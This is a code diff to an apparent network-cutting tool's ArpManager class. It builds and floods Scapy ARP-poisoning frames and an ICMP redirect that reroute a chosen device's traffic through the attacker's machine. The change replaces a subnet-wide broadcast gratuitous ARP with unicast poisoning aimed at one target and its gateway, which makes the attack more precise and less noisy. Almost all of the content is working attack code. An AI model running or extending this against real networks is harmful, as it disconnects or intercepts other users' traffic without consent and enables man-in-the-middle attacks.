@@ -244,6 +244,45 @@ class ArpManager:
 
     # ── Layer 2: Scapy ARP flood ─────────────────────────────────────────────
 
+    @staticmethod
+    def _build_l2_frames(ip: str, gateway: str, target_mac: str, gw_mac: str, my_mac: str) -> list:
+        """Build the *unicast* ARP-poison frames for a single targeted cut.
+
+        Returns L2 Ether/ARP frames that poison only the target↔gateway pair:
+          - to TARGET  (unicast → target_mac): "gateway's IP is at my MAC"
+          - to GATEWAY (unicast → gw_mac):     "target's IP is at my MAC"
+        each as an OP=2 reply + OP=1 request for cache-update compatibility.
+
+        It deliberately emits NO broadcast frame. The previous flood blasted a
+        gratuitous ARP claiming the *gateway's* IP was at our MAC to
+        ff:ff:ff:ff:ff:ff, which rewrote the gateway entry on *every* host on the
+        segment — so cutting one device routed the whole subnet through us (and
+        knocked it offline). A targeted cut must touch only its target and the
+        gateway; if the gateway MAC is unknown we skip that half rather than
+        broadcast-poison the segment.
+        """
+        frames: list = []
+        # To TARGET: gateway's IP is at my MAC (unicast only).
+        frames.append(
+            Ether(src=my_mac, dst=target_mac)
+            / ARP(op=2, hwsrc=my_mac, psrc=gateway, hwdst=target_mac, pdst=ip)
+        )
+        frames.append(
+            Ether(src=my_mac, dst=target_mac)
+            / ARP(op=1, hwsrc=my_mac, psrc=gateway, hwdst="00:00:00:00:00:00", pdst=ip)
+        )
+        # To GATEWAY: target's IP is at my MAC (unicast only; skip if MAC unknown).
+        if gw_mac:
+            frames.append(
+                Ether(src=my_mac, dst=gw_mac)
+                / ARP(op=2, hwsrc=my_mac, psrc=ip, hwdst=gw_mac, pdst=gateway)
+            )
+            frames.append(
+                Ether(src=my_mac, dst=gw_mac)
+                / ARP(op=1, hwsrc=my_mac, psrc=ip, hwdst="00:00:00:00:00:00", pdst=gateway)
+            )
+        return frames
+
     def _start_flood(
         self,
         ip: str,
@@ -268,37 +307,12 @@ class ArpManager:
             self._flood_stops[ip] = stop_evt
 
         def _flood():
-            # Packet A: tell TARGET "GW's IP is at MY mac"
-            # Using both OP=1 (request) and OP=2 (reply) for max compatibility
-            if target_mac:
-                pkt_to_target_r = Ether(src=my_mac, dst=target_mac) / ARP(
-                    op=2, hwsrc=my_mac, psrc=gateway, hwdst=target_mac, pdst=ip
-                )
-                pkt_to_target_q = Ether(src=my_mac, dst=target_mac) / ARP(
-                    op=1, hwsrc=my_mac, psrc=gateway, hwdst="00:00:00:00:00:00", pdst=ip
-                )
-            else:
-                pkt_to_target_r = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
-                    op=2, hwsrc=my_mac, psrc=gateway, pdst=ip
-                )
-                pkt_to_target_q = pkt_to_target_r  # Fallback
+            # Unicast target↔gateway poison frames (A/B). Scoped to this target
+            # only — no subnet-wide broadcast (see _build_l2_frames).
+            l2_frames = self._build_l2_frames(ip, gateway, target_mac, gw_mac, my_mac)
 
-            # Packet B: tell GATEWAY "target's IP is at MY mac"
-            if gw_mac:
-                pkt_to_gw_r = Ether(src=my_mac, dst=gw_mac) / ARP(
-                    op=2, hwsrc=my_mac, psrc=ip, hwdst=gw_mac, pdst=gateway
-                )
-                pkt_to_gw_q = Ether(src=my_mac, dst=gw_mac) / ARP(
-                    op=1, hwsrc=my_mac, psrc=ip, hwdst="00:00:00:00:00:00", pdst=gateway
-                )
-            else:
-                pkt_to_gw_r = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
-                    op=2, hwsrc=my_mac, psrc=ip, pdst=gateway
-                )
-                pkt_to_gw_q = pkt_to_gw_r
-
-            # Packet C: ICMP Redirect (Godly layer)
-            # Tells target "Gateway is better accessed via Me"
+            # Packet C: ICMP Redirect — tells the TARGET (unicast, dst=ip) that
+            # the gateway is better reached via us. Only when both MACs are known.
             if target_mac and gw_mac:
                 try:
                     from scapy.all import ICMP, IP, send
@@ -309,20 +323,10 @@ class ArpManager:
             else:
                 pkt_redirect = None
 
-            # Guard: If we don't have essential MACs, redirect might fail or be noisy
-            if not target_mac or not gw_mac:
-                pkt_redirect = None
-
-            # Packet D: Gratuitous ARP (Broadcasting our presence)
-            pkt_garp = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
-                op=2, hwsrc=my_mac, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway
-            )
-
-            # STEP 4: scapy builds, a raw AF_PACKET socket sends. Serialise the
-            # five static L2 frames once; blast the bytes each iteration. Falls
-            # back to scapy sendp when the raw socket isn't available (non-root)
-            # or a send fails mid-loop, so behaviour is never worse.
-            l2_frames = [pkt_to_target_r, pkt_to_target_q, pkt_to_gw_r, pkt_to_gw_q, pkt_garp]
+            # scapy builds, a raw AF_PACKET socket sends. Serialise the static L2
+            # frames once; blast the bytes each iteration. Falls back to scapy
+            # sendp when the raw socket isn't available (non-root) or a send fails
+            # mid-loop, so behaviour is never worse.
             raw = RawL2Sender(iface)
             raw_bytes = [bytes(p) for p in l2_frames] if raw.available else []
 
